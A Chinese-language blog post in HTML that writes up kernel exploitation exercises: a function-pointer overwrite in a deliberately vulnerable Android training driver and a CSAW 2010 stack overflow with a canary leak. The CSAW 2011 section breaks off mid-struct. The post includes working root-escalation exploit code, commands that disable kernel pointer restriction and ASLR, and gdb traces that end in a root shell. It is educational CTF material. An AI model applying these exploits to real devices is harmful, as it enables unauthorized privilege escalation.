<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>android kernel exploit第二弹 - Dawuge&#039;s blog</title><meta description="command_handler这个漏洞是对类中某指针函数的覆盖，从而在调用该指针函数时劫持，从而执行任意代码"><meta property="og:type" content="blog"><meta property="og:title" content="android kernel exploit第二弹"><meta property="og:url" content="http://yoursite.com/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/"><meta property="og:site_name" content="Dawuge&#039;s blog"><meta property="og:description" content="command_handler这个漏洞是对类中某指针函数的覆盖，从而在调用该指针函数时劫持，从而执行任意代码"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://yoursite.com/img/og_image.png"><meta property="article:published_time" content="2020-03-31T16:00:00.000Z"><meta property="article:modified_time" content="2020-03-31T16:00:00.000Z"><meta property="article:author" content="Dawuge"><meta property="article:tag" content="vul"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/"},"headline":"Dawuge's blog","image":["http://yoursite.com/img/og_image.png"],"datePublished":"2020-03-31T16:00:00.000Z","dateModified":"2020-03-31T16:00:00.000Z","author":{"@type":"Person","name":"Dawuge"},"description":"command_handler这个漏洞是对类中某指针函数的覆盖，从而在调用该指针函数时劫持，从而执行任意代码"}</script><link rel="canonical" href="http://yoursite.com/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/"><link rel="icon" href="/img/avatar.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/avatar.png" alt="Dawuge&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/categories/notes">Notes</a><a class="navbar-item" href="/categories/ctf">CTF</a><a class="navbar-item" href="/categories/vul">Linux</a><a class="navbar-item" href="/categories/vul/android">Android</a><a class="navbar-item" href="/categories/fuzz">Fuzz</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-03-31T16:00:00.000Z" title="2020-03-31T16:00:00.000Z">2020-04-01</time><span class="level-item"><a class="link-muted" href="/categories/vul/">vul</a><span> / </span><a class="link-muted" href="/categories/vul/android/">android</a><span> / </span><a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></span><span class="level-item">24 分钟 读完 (大约 3606 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">android kernel exploit第二弹</h1><div class="content"><h3 id="command-handler"><a href="#command-handler" class="headerlink" title="command_handler"></a>command_handler</h3><p>这个漏洞是对类中某指针函数的覆盖，从而在调用该指针函数时劫持，从而执行任意代码</p>
<a id="more"></a>
<p>结构体在commandhandler.h文件中，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  int (* runHandler)(void);</span><br><span class="line">&#125; CommandHandler;</span><br></pre></td></tr></table></figure>

<p>首先看下源码的问题，漏洞出在write_to_vuln_device函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write_to_vuln_device(struct file *filp, const char * buf, size_t count, loff_t *f_pos)</span><br><span class="line">&#123;</span><br><span class="line">  int ret &#x3D; copy_from_user(&amp;handler,buf,sizeof(CommandHandler));</span><br><span class="line">  if(ret)&#123;</span><br><span class="line">    printk(&quot;Failed to copy %d bytes&quot;, ret);</span><br><span class="line">    return ret;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会使用copy_from_user从buf中读取CommandHandler大小的字节地址到handler的地址中，而这个handler其实也是个CommandHandler结构体,且其内部函数指针指向的函数功能只是返回0。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CommandHandler handler &#x3D; &#123;</span><br><span class="line">  .runHandler &#x3D; &amp;doNothingIntializer</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static int doNothingIntializer()&#123;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那比较明显了，那就比较明显了，如果我们传入的buf的头四个字节是自己设定好的地址的话，那么我们就可以在handler的runHandler函数被调用时，就可以将程序流劫持了。</p>
<p>那是在哪里触发的呢？程序中有这样的一段代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">long device_ioctl(struct file *filp,</span><br><span class="line">                  unsigned int cmd,</span><br><span class="line">                  unsigned long arg)</span><br><span class="line">&#123;</span><br><span class="line">  switch (cmd) &#123;</span><br><span class="line">    case RUN_COMMAND_HANDLER:</span><br><span class="line">       handler.runHandler();</span><br><span class="line">       break;</span><br><span class="line">    default :</span><br><span class="line">       printk(&quot;Unknown ioctl cmd: %d&quot;, cmd);</span><br><span class="line">       return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">struct file_operations device_ops &#x3D; &#123;</span><br><span class="line">  read: read_from_vuln_device,</span><br><span class="line">  write: write_to_vuln_device,</span><br><span class="line">  unlocked_ioctl: device_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static struct miscdevice vuln_device &#x3D; &#123;</span><br><span class="line">        minor: MISC_DYNAMIC_MINOR,</span><br><span class="line">        name: &quot;cmd_handler&quot;, &#x2F;&#x2F; Name ourselves &#x2F;dev&#x2F;string_format</span><br><span class="line">        fops: &amp;device_ops, &#x2F;&#x2F;Struct for the file ops handler</span><br><span class="line">        mode: 666</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到当我们在对该模块（即cmd_handler)调用write，ioctl函数时，该模块就会将这两个函数替换成自己的漏洞函数了，也就是说我们可以先调用write函数，使其触发write_to_vuln_device去覆盖runhandler地址（这里说一点能覆盖的原因是结构体的首地址和第一项内容的起始地址相同，且大小相同），然后再调用unlocked_ioctl触发调用runHandler（kernel 2.6.36 中已经完全删除了struct file_operations 中的ioctl 函数指针，取而代之的是unlocked_ioctl）</p>
<p>看下exp的核心部分，这里的getsymbol函数即打开/proc/kallsyms去获取相应字符串的地址而已：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int run_handler()</span><br><span class="line">&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(0));</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">    commit_creds &#x3D;  (int (*)(unsigned long)) get_symbol(&quot;commit_creds&quot;);</span><br><span class="line">    prepare_kernel_cred &#x3D; (unsigned long(*)(unsigned long)) get_symbol(&quot;prepare_kernel_cred&quot;);</span><br><span class="line">    CommandHandler ch &#x3D;  &#123;</span><br><span class="line">        .runHandler &#x3D; &amp;run_handler</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(&quot;[+] RunHandler at 0x%x\n&quot;, (unsigned int) &amp;run_handler);</span><br><span class="line">    int cmd_handler &#x3D; open(&quot;&#x2F;dev&#x2F;cmd_handler&quot;, O_RDWR);</span><br><span class="line">    check(cmd_handler &gt;&#x3D; 0, &quot;Error opening challenge device&quot;);</span><br><span class="line"></span><br><span class="line">    int rc &#x3D; write(cmd_handler, &amp;ch, sizeof(CommandHandler));</span><br><span class="line">    check(rc &gt;&#x3D; 0, &quot;Error writing to challenge device&quot;);</span><br><span class="line">    #define RUN_COMMAND_HANDLER 0x1337</span><br><span class="line"></span><br><span class="line">    rc &#x3D; ioctl(cmd_handler, RUN_COMMAND_HANDLER, NULL);</span><br><span class="line">    check(rc !&#x3D; -1, &quot;IOCTL failed&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;uid&#x3D;%d, euid&#x3D;%d\n&quot;,getuid(), geteuid() );</span><br><span class="line"></span><br><span class="line">    if(!getuid())</span><br><span class="line">        execl( &quot;&#x2F;system&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, (char*) NULL);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">    error:</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试过程如下，省略部分步骤，分析一同写在里面了。<br>先挂起gdb，然后执行./build_and_run.sh程序，注意由于我们exp需要commit_creds和prepare_kernel_cred地址，所以可以用adb shell进去echo 0 &gt; /proc/sys/kernel/kptr_restrict, 同时关闭随机化echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
<p>在几个重要函数下断点，并来到write_to_vuln_device，此时对应着exp是执行到了write这一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b write_to_vuln_device</span><br><span class="line">Breakpoint 5 at 0xc025be28: file drivers&#x2F;vulnerabilities&#x2F;kernel_build&#x2F;..&#x2F;challenges&#x2F;command_handler&#x2F;module&#x2F;CommandHandler.c, line 29.</span><br><span class="line">(gdb) b device_ioctl</span><br><span class="line">Breakpoint 6 at 0xc025be90: file drivers&#x2F;vulnerabilities&#x2F;kernel_build&#x2F;..&#x2F;challenges&#x2F;command_handler&#x2F;module&#x2F;CommandHandler.c, line 41.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 5, write_to_vuln_device (filp&#x3D;0xd1811680, </span><br><span class="line">    buf&#x3D;0xbefffab8 &quot;5\203&quot;, count&#x3D;4, f_pos&#x3D;0xd186bf88)</span><br><span class="line">    at drivers&#x2F;vulnerabilities&#x2F;kernel_build&#x2F;..&#x2F;challenges&#x2F;command_handler&#x2F;module&#x2F;CommandHandler.c:29</span><br><span class="line">29      &#123;</span><br></pre></td></tr></table></figure>

<p>可以发现程序用来覆盖的值应该是0x8335，也就是run_handler()的函数地址，但是现在无法查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x&#x2F;10xw 0xbefffab8</span><br><span class="line">0xbefffab8:     0x00008335      0x8e6a2130    0x0004d5a8                    0x6474e552</span><br><span class="line">0xbefffac8:     0x00000fff      0x00008743    0x00000001                    0xbefffb54</span><br><span class="line">0xbefffad8:     0xbefffb5c      0xbefffb9c</span><br></pre></td></tr></table></figure>

<p>步进到copy_from_user，查看填入地址和其内容发现确实是handler和runhandler，且此时from地址的值就是0x00008335</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user (n&#x3D;4, from&#x3D;0xbefffab8, to&#x3D;0xc04ac2fc)</span><br><span class="line">    at &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;kernel_pwn&#x2F;playground&#x2F;goldfish&#x2F;arch&#x2F;arm&#x2F;include&#x2F;asm&#x2F;uaccess.h:421</span><br><span class="line">421                     n &#x3D; __copy_from_user(to, from, n);</span><br><span class="line">(gdb) x&#x2F;10xw 0xc04ac2fc</span><br><span class="line">0xc04ac2fc &lt;handler&gt;:   0xc025be18      0x0000003a                          0xc041ddc1       0xc04ac324</span><br><span class="line">0xc04ac30c &lt;vuln_device+12&gt;:    0xc04ac2dc    0xc04ac3bc                    0x00000000       0xdeaa61c0</span><br><span class="line">0xc04ac31c &lt;vuln_device+28&gt;:    0x00000000    0x0000029a</span><br><span class="line">(gdb) x&#x2F;10xw 0xc025be18</span><br><span class="line">0xc025be18 &lt;doNothingIntializer&gt;:       0xe3a00000                          0xe12fff1e       0xe3a00000      0xe12fff1e</span><br><span class="line">0xc025be28 &lt;write_to_vuln_device&gt;:      0xe92d4010                          0xe1a0200d       0xe3c23d7f      0xe59f004c</span><br><span class="line">0xc025be38 &lt;write_to_vuln_device+16&gt;:   0xe3c3303f                          0xe5933008</span><br><span class="line">(gdb) x&#x2F;10xw 0xbefffab8</span><br><span class="line">0xbefffab8:     0x00008335      0x8e6a2130    0x0004d5a8                    0x6474e552</span><br><span class="line">0xbefffac8:     0x00000fff      0x00008743    0x00000001                    0xbefffb54</span><br><span class="line">0xbefffad8:     0xbefffb5c      0xbefffb9c</span><br></pre></td></tr></table></figure>

<p>来到device_ioctl，此时对应着exp应该是调用了ioctl函数所以触发到这里，查看runhandler地址已被覆盖为0x00008335，同时查看传入的cmd为0x1337正好对应着RUN_COMMAND_HANDLER的值，所以接下来会触发handler.runhandler()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 6, device_ioctl (filp&#x3D;0xd1811680, cmd&#x3D;4919, arg&#x3D;0)</span><br><span class="line">    at drivers&#x2F;vulnerabilities&#x2F;kernel_build&#x2F;..&#x2F;challenges&#x2F;command_handler&#x2F;module&#x2F;CommandHandler.c:41</span><br><span class="line">41      &#123;</span><br><span class="line">(gdb) x&#x2F;10xw 0xc04ac2fc</span><br><span class="line">0xc04ac2fc &lt;handler&gt;:   0x00008335      0x0000003a                          0xc041ddc1       0xc04ac324</span><br><span class="line">0xc04ac30c &lt;vuln_device+12&gt;:    0xc04ac2dc    0xc04ac3bc                    0x00000000       0xdeaa61c0</span><br><span class="line">0xc04ac31c &lt;vuln_device+28&gt;:    0x00000000    0x0000029a</span><br><span class="line">(gdb) p&#x2F;x 4919</span><br><span class="line">$1 &#x3D; 0x1337</span><br></pre></td></tr></table></figure>

<p>步进到handler.runHandler()后查看下其汇编函数，发现pc即将跳转到寄存器r3指向的地址，查看下r3的值，发现就是我们劫持填入的地址，这里直接看0x8335的内容识别不了，但可以根据在exp中打印出我们所写的提权函数run_handler的地址，发现也是0x8335，因此可以得知跳转到了我们的函数。（当然也可以尝试下反汇编，这里我就不试了)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb)</span><br><span class="line">0xc025bea8      44             handler.runHandler();</span><br><span class="line">(gdb) disass</span><br><span class="line">Dump of assembler code for function device_ioctl:</span><br><span class="line">   0xc025be90 &lt;+0&gt;:     push    &#123;r3, lr&#125;</span><br><span class="line">   0xc025be94 &lt;+4&gt;:     movw    r3, #4919     ; 0x1337</span><br><span class="line">   0xc025be98 &lt;+8&gt;:     cmp     r1, r3</span><br><span class="line">   0xc025be9c &lt;+12&gt;:    bne     0xc025beb4 &lt;device_ioctl+36&gt;</span><br><span class="line">   0xc025bea0 &lt;+16&gt;:    ldr     r3, [pc, #28] ; 0xc025bec4</span><br><span class="line">   0xc025bea4 &lt;+20&gt;:    ldr     r3, [r3]</span><br><span class="line">&#x3D;&gt; 0xc025bea8 &lt;+24&gt;:    blx     r3</span><br><span class="line">   0xc025beac &lt;+28&gt;:    mov     r0, #0</span><br><span class="line">   0xc025beb0 &lt;+32&gt;:    pop     &#123;r3, pc&#125;</span><br><span class="line">   0xc025beb4 &lt;+36&gt;:    ldr     r0, [pc, #12] ; 0xc025bec8</span><br><span class="line">   0xc025beb8 &lt;+40&gt;:    bl      0xc0362f60 &lt;printk&gt;</span><br><span class="line">   0xc025bebc &lt;+44&gt;:    mvn     r0, #0</span><br><span class="line">   0xc025bec0 &lt;+48&gt;:    pop     &#123;r3, pc&#125;</span><br><span class="line">   0xc025bec4 &lt;+52&gt;:    strdgt  r12, [r10], #-44                            ; 0xffffffd4</span><br><span class="line">   0xc025bec8 &lt;+56&gt;:    subgt   sp, r1, r3, lsl #27</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) p&#x2F;x $r3</span><br><span class="line">$3 &#x3D; 0x8335</span><br><span class="line">(gdb) disass 0x8335</span><br><span class="line">No function contains specified address.</span><br><span class="line">(gdb) x&#x2F;10xw 0x8335</span><br><span class="line">0x8335: 0x06af02b5      0x78490748      0x00447944                          0x04680968</span><br><span class="line">0x8345: 0x09200068      0xa0478868      0xd0200047                          0x58bf00bd</span><br><span class="line">0x8355: 0x5a00046b      0xbf00046b</span><br></pre></td></tr></table></figure>

<p>最终利用成功如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[arm64-v8a] Install        : solution &#x3D;&gt; libs&#x2F;arm64-v8a&#x2F;solution</span><br><span class="line">[x86_64] Install        : solution &#x3D;&gt; libs&#x2F;x86_64&#x2F;solution</span><br><span class="line">[armeabi-v7a] Install        : solution &#x3D;&gt; libs&#x2F;armeabi-v7a&#x2F;solution</span><br><span class="line">[x86] Install        : solution &#x3D;&gt; libs&#x2F;x86&#x2F;solution</span><br><span class="line">1182 KB&#x2F;s (292168 bytes in 0.241s)</span><br><span class="line">[+] resolved symbol commit_creds to 0xc0039834</span><br><span class="line">[+] resolved symbol prepare_kernel_cred to 0xc0039d34</span><br><span class="line">[+] RunHandler at 0x8335</span><br><span class="line">uid&#x3D;0, euid&#x3D;0</span><br><span class="line">root@generic:&#x2F; #</span><br></pre></td></tr></table></figure>

<h3 id="csaw-2010"><a href="#csaw-2010" class="headerlink" title="csaw 2010"></a>csaw 2010</h3><p>这题的漏洞是栈溢出，但是要绕过canary，这题提供了一种绕过canary的方法。</p>
<p>原理是由于proc接口就像提供了一个文件的接口，因此可以对proc目录下的打开的文件描述符调用lseek函数，从而导致传递给csaw_read函数的off参数可以是非零值。通过这个属性我们可以在进程中dump出canary的值后将它填入具体位置绕过。利用如下，具体的偏移值（如canary和ret的距离）可以通过动态调试确定：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">void trigger_vuln(int fd, int canary)</span><br><span class="line">&#123;</span><br><span class="line">    #define MAX_PAYLOAD (MAX + 1  * sizeof(void*) )</span><br><span class="line">    char buf[MAX_PAYLOAD], *p;</span><br><span class="line">    bzero(buf, sizeof(buf));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; memset(buf, &#39;A&#39;, sizeof(buf));</span><br><span class="line">    p &#x3D; buf + MAX;</span><br><span class="line">    *(void **)p &#x3D; (void *)canary;</span><br><span class="line"></span><br><span class="line">    p +&#x3D; 7 * sizeof(void *);</span><br><span class="line">    *(void **)p &#x3D; (void *) &amp;kernel_code;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Point p to the canary&#39;s spot and set it. *&#x2F;</span><br><span class="line">    printf(&quot;Payload:\n&quot;);</span><br><span class="line">    print_hex(buf, sizeof(buf));</span><br><span class="line">    printf(&quot;[*] hold on to your butts\n&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;* Kaboom! *&#x2F;</span><br><span class="line">    write(fd, buf, sizeof(buf));</span><br><span class="line">&#125;</span><br><span class="line">int gather_information(int fd)</span><br><span class="line">&#123;</span><br><span class="line">    int canary, i;</span><br><span class="line">    if (lseek(fd, 32, SEEK_SET) &#x3D;&#x3D; -1)</span><br><span class="line">            err(2, &quot;lseek&quot;);</span><br><span class="line">    read(fd, &amp;canary, sizeof(canary));</span><br><span class="line">    printf(&quot;[+] found canary: %08x\n&quot;, canary);</span><br><span class="line">    return canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="csaw-2011"><a href="#csaw-2011" class="headerlink" title="csaw 2011"></a>csaw 2011</h3><p>这题很迷。。。调到后面才发现结构体不一样。。。但还是学到些东西的</p>
<p>简单说下原理：在Linux上，系统上的每个线程都在内核内存中分配了相应的内核堆栈。 x86上的Linux内核堆栈的大小为4096或8192字节。尽管此大小似乎很小，无法包含完整的调用链和相关的本地堆栈变量，但实际上内核调用链相对较浅，当使用高效的分配器（如SLUB）时，不鼓励内核函数滥用带有大局部堆栈变量的宝贵空间。可用。堆栈与thread_info结构共享4k / 8k的总大小，该结构包含有关当前线程的一些元数据，如include/linux/sched.h中所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union thread_union &#123;</span><br><span class="line">	struct thread_info thread_info;</span><br><span class="line">	unsigned long stack[THREAD_SIZE&#x2F;sizeof(long)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>根据题目的提示的信息，我们可以对应到linux v2.6.39.4的版本<br>然后在x86下的thread_info的结构是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">struct thread_info &#123;</span><br><span class="line">	struct task_struct	*task;		&#x2F;* main task structure *&#x2F;</span><br><span class="line">	struct exec_domain	*exec_domain;	&#x2F;* execution domain *&#x2F;</span><br><span class="line">	__u32			flags;		&#x2F;* low level flags *&#x2F;</span><br><span class="line">	__u32			status;		&#x2F;* thread synchronous flags *&#x2F;</span><br><span class="line">	__u32			cpu;		&#x2F;* current CPU *&#x2F;</span><br><span class="line">	int			preempt_count;	&#x2F;* 0 &#x3D;&gt; preemptable,</span><br><span class="line">						   &lt;0 &#x3D;&gt; BUG *&#x2F;</span><br><span class="line">	mm_segment_t		addr_limit;</span><br><span class="line">	struct restart_block    restart_block;</span><br><span class="line">	void __user		*sysenter_return;</span><br><span class="line">#ifdef CONFIG_X86_32</span><br><span class="line">	unsigned long           previous_esp;   &#x2F;* ESP of the previous stack in</span><br><span class="line">						   case of nested (IRQ) stacks</span><br><span class="line">						*&#x2F;</span><br><span class="line">	__u8			supervisor_stack[0];</span><br><span class="line">#endif</span><br><span class="line">	int			uaccess_err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于内核内存空间有限，当内核中的函数需要超过4k / 8k的堆栈空间或长调用链超出可用堆栈空间时，那么就会发生堆栈溢出，并且如果thread_info结构或超出其的关键内存损坏，则常会导致内核崩溃。但是如果可以对齐其结构体，并且存在实际可以控制写入堆栈及其以外的数据的情况，则可能存在可利用的条件。这里的话，是将restart_block作为一个攻击切入点， restart_block是每个线程的结构，用于跟踪信息和参数以重新启动系统调用。如果在sigaction 中指定了SA_RESTART，则被信号中断的系统调用可以中止并返回EINTR，也可以自行重启。在include/linux/thread_info.h中，restart_block的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">struct restart_block &#123;</span><br><span class="line">	long (*fn)(struct restart_block *);</span><br><span class="line">	union &#123;</span><br><span class="line">		&#x2F;* For futex_wait and futex_wait_requeue_pi *&#x2F;</span><br><span class="line">		struct &#123;</span><br><span class="line">			u32 __user *uaddr;</span><br><span class="line">			u32 val;</span><br><span class="line">			u32 flags;</span><br><span class="line">			u32 bitset;</span><br><span class="line">			u64 time;</span><br><span class="line">			u32 __user *uaddr2;</span><br><span class="line">		&#125; futex;</span><br><span class="line">		&#x2F;* For nanosleep *&#x2F;</span><br><span class="line">		struct &#123;</span><br><span class="line">			clockid_t clockid;</span><br><span class="line">			struct timespec __user *rmtp;</span><br><span class="line">#ifdef CONFIG_COMPAT</span><br><span class="line">			struct compat_timespec __user *compat_rmtp;</span><br><span class="line">#endif</span><br><span class="line">			u64 expires;</span><br><span class="line">		&#125; 